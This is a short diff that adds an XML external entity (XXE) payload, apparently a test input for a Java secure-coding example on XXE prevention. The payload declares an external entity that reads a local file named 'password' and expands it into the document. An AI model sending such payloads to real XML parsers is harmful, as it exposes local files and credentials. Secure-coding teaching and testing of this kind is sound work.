@@ -1,0 +1,4 @@
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:./JavaSCR/src/main/java/IDS17J/password" >]>
+   <foo>&xxe;</foo>
